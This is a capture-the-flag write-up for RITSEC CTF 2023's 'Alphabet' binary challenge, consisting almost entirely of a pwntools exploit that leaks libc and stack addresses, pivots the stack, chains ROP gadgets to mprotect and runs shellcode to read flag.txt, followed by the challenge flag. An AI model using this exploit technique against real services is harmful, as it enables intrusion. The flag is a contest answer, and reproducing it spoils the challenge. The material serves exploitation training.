![image](https://user-images.githubusercontent.com/63996033/229366825-3bace83b-5fa7-45ab-99fd-2635176591d3.png)

[alphabet_deploy.tar](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/Alphabet/alphabet_deploy.tar)

Solution:
```py
from pwn import *
context.binary = elf = ELF("./alphabet.bin")
libc = ELF("./libc.so.6")

# context.log_level = 'debug'
# io = elf.process()
# gdb.attach(io)
io = remote("127.0.0.1",5000)

def checksum(data):
    checksum = 0
    for d in data:
        checksum += d ^ 0x55
    return checksum & 0xff

# leak libc _IO_file_overflow
index1 = -0xe8-0x12
index2 = 0

pkt = b"Z\x08"
pkt += p64(index1,signed=True)
pkt += p64(index2,signed=True)
pkt += p8(checksum(pkt))

io.clean()
io.sendline(pkt)

io.readuntil(b"characters: ")
libc_leak = u64(io.readline().strip().ljust(8,b"\x00"))
print("LIBC LEAK:",hex(libc_leak))
libc.address = libc_leak - libc.symbols['_IO_file_overflow']-259
print("LIBC BASE:",hex(libc.address))

# leak stack
index1 = -0x78-0x12
index2 = 0

pkt = b"Z\x08"
pkt += p64(index1,signed=True)
pkt += p64(index2,signed=True)
pkt += p8(checksum(pkt))

io.clean()
io.sendline(pkt)

io.readuntil(b"characters: ")
stack = u64(io.readline().strip().ljust(8,b"\x00"))
print("STACK LEAK:",hex(stack))

# switch rbp
index1 = -0x22
index2 = -0x42

pkt = b"Z\x08"
pkt += p64(index1,signed=True)
pkt += p64(index2,signed=True)
pkt += p8(checksum(pkt))

io.sendline(pkt)

# 2.5 gadgets
# call fgets with new basepointer to get 0x2d byte write onto stack
pop_rbp = 0x000000000040125d
fgets = 0x401734
payload = b"\x90"*0x18
payload += p64(pop_rbp)
payload += p64(stack+0x40-0x1c)
payload += p64(fgets)

# 4.5 gadgets
# call gets on stack and pivot
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_r12 = libc.address + 0x000000000011f497
pop_rax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x0000000000091396
leave_ret = 0x0000000000401437

payload += p64(pop_rdi)
payload += p64(stack)
payload += p64(libc.symbols['gets'])
payload += p64(leave_ret)


sc_addr = elf.bss()&0xfffff000

sc = asm(shellcraft.amd64.linux.open("./flag.txt"))
sc += asm(shellcraft.amd64.linux.read("rax",elf.bss(0x30),0x50))
sc += asm(shellcraft.amd64.linux.write(1,elf.bss(0x30),0x50))

# unlimited gadgets
# rop to mprotect
payload += b"A"*8
payload += p64(pop_rdi)
payload += p64(sc_addr)
payload += p64(pop_rsi)
payload += p64(0x1000)
payload += p64(pop_rdx_r12)
payload += p64(7)*2
payload += p64(libc.symbols['mprotect'])
# read sc
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(sc_addr+0x200)
payload += p64(pop_rdx_r12)
payload += p64(0x100)*2
payload += p64(syscall)
payload += p64(sc_addr+0x200)
io.sendline(payload)

io.clean()
io.sendline(sc)
# io.interactive()
print(io.readline())
```

Flag: `RS{Bh_nB_whB_r3pl4c3d_B}`
